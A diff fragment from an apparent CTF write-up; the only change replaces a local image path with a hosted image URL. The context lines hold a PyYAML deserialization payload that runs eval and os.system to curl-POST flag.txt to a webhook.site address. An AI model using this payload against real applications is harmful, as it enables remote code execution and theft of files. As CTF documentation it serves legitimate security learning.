@@ -50,7 +50,7 @@ Apparently it was a zero day vulunrability used in a CTF, what a chad move. We c
 
 `!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ '__import__("os").system("curl -X POST --data-binary @flag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9")' ]]]`
 
-![image-20211221164628024](image-20211221164628024.png)
+![](https://raw.githubusercontent.com/octo-kumo/images/master/image-20211221164628024.png)
 
 And after checking webhook.site for the recieved curl request
 
